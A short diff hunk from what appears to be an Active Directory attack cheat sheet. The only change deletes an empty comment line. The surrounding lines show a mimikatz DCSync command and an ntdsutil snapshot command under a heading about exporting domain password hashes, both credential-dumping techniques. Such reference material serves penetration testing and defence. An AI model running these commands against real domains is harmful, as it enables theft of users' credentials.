@@ -607,7 +607,6 @@ lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user> /
 - Exporting AD member hashes
 
 ```cmd
-REM
 REM create a snapshot
 ntdsutil snapshot "activate instance ntds" create quit quit
 REM
